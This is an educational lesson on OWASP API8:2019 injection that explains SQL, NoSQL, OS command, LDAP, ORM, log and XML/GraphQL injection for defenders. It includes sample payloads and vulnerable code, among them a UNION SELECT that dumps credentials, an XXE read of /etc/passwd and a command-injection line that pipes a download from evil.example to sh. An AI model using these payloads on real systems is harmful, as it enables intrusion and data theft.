# API8:2019 Injection - Overview

## Table of Contents
- [What is Injection?](#what-is-injection)
- [Why Does This Matter?](#why-does-this-matter)
- [Technical Context](#technical-context)
- [The Injection Family in APIs](#the-injection-family-in-apis)
- [Real-World Impact](#real-world-impact)
- [Prevalence and Severity](#prevalence-and-severity)
- [Common Misunderstandings](#common-misunderstandings)
- [Edition Note (2019 vs 2023)](#edition-note-2019-vs-2023)

## What is Injection?

**Injection** occurs when untrusted data from an API request is sent to a downstream interpreter as part of a command or query, and the interpreter cannot tell the attacker's data apart from the developer's instructions. The interpreter dutifully executes whatever it is handed—so a value that was supposed to be a *username* becomes a *query operator*, a value that was supposed to be a *filename* becomes a *shell command*, and the boundary between "code" and "data" collapses.

The root cause is always the same shape: **a string (or structured object) built from request input is interpreted, rather than treated as inert data.** The interpreter changes—a SQL engine, a MongoDB query planner, an OS shell, an LDAP directory, an XML/XPath parser, a log sink—but the mechanism does not. Wherever an API takes a parameter, a JSON body field, a header, or a query string and splices it into something that will be *parsed and acted on*, injection is possible.

### Core Concept

```
Safe (data stays data):
  input "value"  -->  bound as a PARAMETER  -->  interpreter treats it as a literal
                      SELECT * FROM users WHERE name = ?     ["value"]

Injection (data becomes code):
  input "' OR '1'='1"  -->  CONCATENATED into the query text
                      SELECT * FROM users WHERE name = '' OR '1'='1'
                      the OR clause is now part of the SQL the engine runs
```

### Why APIs Make Injection Distinct

Classic web injection came through HTML forms and query strings. APIs shift the shape of the attack surface in ways that matter:

- APIs accept **rich, structured input**—JSON and XML bodies—so the attacker can inject not just strings but whole *objects*. A field that the code expects to be a string (`"password": "hunter2"`) can arrive as an operator object (`"password": {"$ne": null}`), which is the signature of NoSQL injection.
- APIs frequently expose **flexible query semantics**—client-driven `sort`, `filter`, `fields`, and search parameters—that get spliced straight into queries or query builders.
- APIs are **machine-to-machine**, so malformed or hostile input is not filtered by a browser and rarely noticed by a human.
- APIs chain to **many interpreters at once**: one endpoint may touch a SQL database, a document store, a shell for a thumbnailer, and a logging pipeline—each an injection sink.

## Why Does This Matter?

### Business Impact

- **Mass Data Theft**: A single injectable endpoint can dump an entire table or collection—every user, order, and secret—in one query.
- **Authentication Bypass**: Injected boolean logic (SQL `OR 1=1`, NoSQL `{"$ne": null}`) turns a login check into an always-true condition.
- **Data Tampering and Destruction**: Injection can update or delete records, not just read them—stacked queries and operator abuse can corrupt or wipe data.
- **Full Server Compromise**: OS command injection yields remote code execution and a foothold to pivot into the internal network.
- **Regulatory Fallout**: Exposure of personal or payment data triggers GDPR, HIPAA, and PCI-DSS obligations, fines, and breach notification.

### Technical Impact

- **Confidentiality**: Read arbitrary rows, columns, documents, or files the query engine can reach.
- **Integrity**: Modify or delete data; poison logs to hide activity or mislead responders.
- **Availability**: Expensive injected queries (e.g. a `$where` loop, a heavy `OR`) exhaust the datastore.
- **Remote Code Execution**: Command, some ORM, and some deserialization-adjacent injection paths run attacker code on the host.
- **Lateral Movement**: A shelled-out interpreter or an over-privileged DB account becomes the beachhead for the next hop.

## Technical Context

### The Universal Injection Recipe

Every injection bug is an instance of the same three-part pattern. Learn to spot it and you can find them in any language against any interpreter:

```
1. A SOURCE of untrusted input
   - request query string / path parameter
   - JSON or XML body field (string OR nested object)
   - HTTP header (Host, User-Agent, X-Forwarded-For, custom)

2. A SINK that interprets a command or query
   - SQL engine, NoSQL query planner, OS shell, LDAP directory,
     XPath/XML parser, ORM raw-query API, log formatter, GraphQL resolver

3. A LACK OF SEPARATION between code and data
   - string concatenation / template interpolation into the command
   - passing a user-controlled object where a scalar was assumed
   - no parameterisation, no type check, no allow-list, no encoding
```

### 1. SQL Injection

```sql
-- Endpoint: GET /api/products?category=books
-- Vulnerable query is built by concatenation:
"SELECT * FROM products WHERE category = '" + category + "'"

-- Attacker sends: category = books' UNION SELECT username,password,3 FROM users--
SELECT * FROM products WHERE category = 'books'
  UNION SELECT username,password,3 FROM users--'
```

**Risk**: read/modify any data the DB account can reach; classic `' OR '1'='1` auth bypass; `UNION` and blind/boolean/time-based extraction.

### 2. NoSQL Injection (operator injection)

```javascript
// Endpoint expects: {"username":"alice","password":"hunter2"}
// Vulnerable code passes the parsed body straight into the query:
db.users.findOne({ username: body.username, password: body.password })

// Attacker sends a JSON body where the values are OPERATOR OBJECTS:
{ "username": { "$gt": "" }, "password": { "$ne": null } }
// Query becomes: find any user whose password is not null -> login bypass
```

**Risk**: In document stores like MongoDB, JSON values that arrive as `{"$gt":""}`, `{"$ne":null}`, or `{"$regex":"^a"}` are treated as query operators, bypassing authentication and enumerating data. A `$where` or `$function` clause can even run server-side JavaScript.

### 3. OS Command Injection

```bash
# Endpoint: POST /api/convert  {"filename":"report.pdf"}
# Vulnerable: user input shelled out via a string command
os.system("convert " + filename + " out.png")

# Attacker sends: filename = report.pdf; curl evil.example/x | sh
convert report.pdf; curl evil.example/x | sh out.png
#                 ^ shell metacharacter ; starts a second command
```

**Risk**: direct remote code execution. Metacharacters `;` `|` `&` `&&` `$(...)` `` `...` `` chain attacker commands onto the intended one.

### 4. LDAP Injection

```
# Endpoint: GET /api/directory?user=alice
# Vulnerable filter built by concatenation:
(&(uid=alice)(objectClass=person))

# Attacker sends: user = *)(uid=*))(|(uid=*
(&(uid=*)(uid=*))(|(uid=*)(objectClass=person))
#        ^ wildcard + injected clauses -> match every entry
```

**Risk**: authentication bypass and enumeration of the entire directory by injecting filter metacharacters `* ( ) & |`.

### 5. ORM / Query-Builder Injection

```
# An ORM does NOT make you safe if you hand it raw, concatenated SQL:
User.objects.raw("SELECT * FROM users WHERE name = '" + name + "'")   # Django, unsafe
session.query(User).filter(text("name = '" + name + "'"))            # SQLAlchemy text(), unsafe
knex.raw(`SELECT * FROM users WHERE name = '${name}'`)               # Knex raw, unsafe
```

**Risk**: teams assume "we use an ORM, so we're safe," but raw-string escape hatches (`.raw()`, `text()`, string-built `WHERE`/`ORDER BY`) reintroduce classic SQL injection.

### 6. Header and Log Injection

```
// User-controlled value written straight into a log line:
log.info("login attempt user=" + username)

// Attacker sets username to inject a forged line (CRLF):
username = alice\r\n2026-01-01 12:00:00 INFO login success user=admin
// The log now contains a fabricated "admin success" entry
```

**Risk**: forged/spoofed log entries that mislead investigators, break log parsers, or inject into downstream systems that consume the log. The same CRLF trick against response headers enables response splitting.

### 7. Injection via JSON / XML Parameters and GraphQL

```
# XML body parsed without disabling external entities (XXE is an injection cousin):
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>

# GraphQL argument spliced into a downstream query:
query { user(where: "id=1 OR 1=1") { email } }   # arg passed raw to SQL/filter
```

**Risk**: structured request formats give attackers extra channels—XML external entities, and GraphQL arguments that are forwarded unsanitised into a downstream interpreter.

## The Injection Family in APIs

| Type | Interpreter / Sink | Signature Payload Shape | Primary Impact |
|------|--------------------|-------------------------|----------------|
| SQL injection | Relational DB engine | `' OR '1'='1`, `UNION SELECT` | Data theft, auth bypass, tamper |
| NoSQL injection | Document store query planner | `{"$ne":null}`, `{"$gt":""}` | Auth bypass, enumeration, RCE via `$where` |
| OS command | System shell | `; id`, `$(id)`, `| whoami` | Remote code execution |
| LDAP | Directory server | `*)(uid=*)` | Auth bypass, directory dump |
| ORM / query-builder | DB via raw escape hatch | Concatenated `raw()`/`text()` | SQL injection re-introduced |
| Header / log | Log sink, HTTP response | CRLF `\r\n` | Log forgery, response splitting |
| XML / XPath | XML parser | External entity, `' or '1'='1` | File read, SSRF, auth bypass |
| GraphQL argument | Resolver → downstream | Raw arg forwarded to a query | Depends on downstream sink |

## Real-World Impact

The examples below describe **classes** of incident that are widely documented across the industry. They avoid naming specific CVEs or citing precise counts—the durable lesson is the pattern, not a headline number.

### Case Study 1: SQL Injection Behind an API Endpoint

**Pattern**:
- A search or listing endpoint builds its `WHERE` clause by concatenating a query-string parameter.
- An attacker supplies `UNION SELECT` or boolean/time-based payloads and extracts data column by column.

**Impact**: Whole-table exfiltration of customer records and credential hashes has repeatedly resulted from a single unparameterised endpoint. Because the API returns structured JSON, automated tooling extracts data quickly.

**Root Cause**: String-built SQL with no parameterisation. The fix—prepared statements—is decades old and still the definitive control.

### Case Study 2: NoSQL Authentication Bypass via JSON Operators

**Pattern**:
- A login API forwards the parsed JSON body directly into a MongoDB `findOne` query.
- The client is trusted to send string values, but sends operator objects (`{"$ne": null}`) instead.

**Impact**: The password comparison becomes "password is not null," which is true for every user—authentication is bypassed without knowing any credential. The same operator trick enumerates records via `$regex`.

**Root Cause**: Trusting the *type* of a JSON field. The fix is to reject non-string values and never pass raw user objects into a query.

### Case Study 3: OS Command Injection in a Processing Endpoint

**Pattern**:
- An endpoint that converts, resizes, pings, or archives shells out to a command line built from a user-supplied filename, URL, or host.
- An attacker injects shell metacharacters to append their own command.

**Impact**: Remote code execution on the API host, followed by credential theft and lateral movement. Image-processing, "ping this host," and export-to-file features are recurring offenders.

**Root Cause**: Building a shell string from input and invoking a shell. The fix is to avoid the shell entirely—pass arguments as an array to `execFile`/`subprocess.run([...])`.

## Prevalence and Severity

Injection has appeared at or near the top of application-security risk lists for many years. In the 2019 OWASP API Security Top 10 it is a dedicated category (API8:2019). The defensible picture, without leaning on any single statistic:

- Injection is characterised as **common and often easy to exploit**, with tooling (fuzzers, SQLi/NoSQLi scanners) that finds candidate points automatically.
- Its **technical impact is severe**—up to full data disclosure, data destruction, or remote code execution—which keeps it high on every risk ranking even when prevalence drops as frameworks improve.
- Prevalence has **declined slowly** as parameterised queries and ORMs became defaults, but the raw-string escape hatches and NoSQL operator patterns keep it alive in modern APIs.

> Note: exact percentages and breach counts vary between reports and years. Treat any single figure as illustrative; the durable takeaway is that injection is easy to find, cheap to exploit, and catastrophic when it lands.

## Common Misunderstandings

### Myth 1: "We use an ORM, so we can't have injection"

**Reality**: ORMs are safe only when you use their parameterised APIs. Every ORM ships a raw-query escape hatch (`raw()`, `text()`, `$queryRawUnsafe`), and string-built `ORDER BY`/`WHERE` fragments reintroduce classic SQL injection.

### Myth 2: "NoSQL databases aren't vulnerable to injection"

**Reality**: Document stores are vulnerable to *operator* injection. A JSON value that arrives as `{"$ne": null}` or `{"$gt": ""}` changes the query's logic, and `$where` can execute server-side JavaScript.

### Myth 3: "Input validation / a WAF stops all injection"

**Reality**: Blocklists and WAFs are bypassable and are defence-in-depth, not the fix. The primary control is separating code from data at the sink—parameterisation—so that even a payload that slips past the filter is treated as inert data.

### Myth 4: "Escaping the input is enough"

**Reality**: Escaping is interpreter-specific and error-prone—escaping for SQL does nothing for a shell, and hand-rolled escaping misses edge cases (encodings, quoting contexts). Prefer parameterisation and safe APIs; use escaping only where a parameter genuinely cannot be bound.

### Myth 5: "It's read-only data, so injection is low risk"

**Reality**: Read-only SQL injection still dumps every row the account can see, and blind techniques extract data one bit at a time. "Read-only" also assumes least-privilege that is often not configured.

### Myth 6: "Only the login form matters"

**Reality**: Every parameter is a candidate—`sort`, `filter`, `fields`, headers, and nested JSON. Client-driven sorting/filtering that maps a string to a column name is a frequent, overlooked sink.

## Edition Note (2019 vs 2023)

> **This lesson uses the 2019 framing.** In the OWASP API Security Top 10 *2019* edition, **Injection is a standalone entry: API8:2019**. In the *2023* edition, Injection was **removed as a dedicated category**—its concerns were absorbed into general secure-coding guidance and overlap with other categories (and injection remains a standalone entry in the separate OWASP *Web* Top 10). The vulnerability class did not go away; the taxonomy changed. Everything in this lesson—SQL, NoSQL, command, LDAP, ORM, header/log, and XML/GraphQL injection—still applies to APIs today.

## How Injection Differs from Related Issues

| Aspect | Injection (API8:2019) | Security Misconfiguration (API8:2023) | Broken Object-Level Auth (API1) |
|--------|-----------------------|---------------------------------------|---------------------------------|
| **Root cause** | Untrusted data in a command/query | Insecure settings/defaults | Missing per-object access check |
| **Where it lives** | Query/command construction | Config of every layer | Authorization logic |
| **Typical fix** | Parameterise, type, allow-list | Harden and disable | Verify ownership server-side |
| **Detection** | Fuzzing, code review, SAST | Config scan, header check | Access testing per object |

## Key Takeaways

1. **Injection is one pattern, many interpreters**—source, sink, and no separation between code and data.
2. **APIs widen the surface**—JSON/XML bodies let attackers inject whole objects, not just strings (NoSQL operator injection).
3. **Parameterisation is the definitive fix**—bind values so the interpreter can never confuse them for commands.
4. **ORMs and NoSQL are not immune**—raw escape hatches and operator objects keep injection alive.
5. **Validation, least privilege, and WAFs are defence-in-depth**, layered on top of parameterisation—never a substitute for it.

## How to Identify if You're Vulnerable

- [ ] Is every SQL query parameterised (prepared statements / bound parameters), with no string concatenation of input?
- [ ] Do you ever pass a raw request object/field straight into a NoSQL query, or accept operator objects where a string is expected?
- [ ] Do you shell out with user input? If so, do you use an argument array and avoid a shell entirely?
- [ ] Are `sort`, `filter`, and `fields` parameters mapped through an allow-list of known column/field names?
- [ ] Are LDAP filters and XPath queries built with proper escaping or parameterised APIs?
- [ ] Is user input strongly typed and validated (reject `$`-prefixed keys, unexpected objects, CRLF) at the edge?
- [ ] Do database accounts run with least privilege (no `DROP`/admin rights for the app account)?
- [ ] Are XML parsers configured to disable external entities?
- [ ] Do GraphQL resolvers sanitise arguments before forwarding them to a downstream interpreter?
- [ ] Is user-controlled data neutralised (CRLF stripped/encoded) before being written to logs or response headers?

If you answered "no" or "not sure" to several of these, you likely have exploitable injection today.

## Next Steps

- **[Attack Vectors](attack-vectors.md)**: How attackers find and exploit injection across interpreters
- **[Prevention](prevention.md)**: Parameterise, type, allow-list, and least-privilege by default
- **[Examples](examples.md)**: Vulnerable vs. secure code in Flask, Express, and Spring
- **[API Security Top 10](/learn/api)**: Back to the full learning path
- **[Practice](/practice)**: Test your skills against injectable endpoints
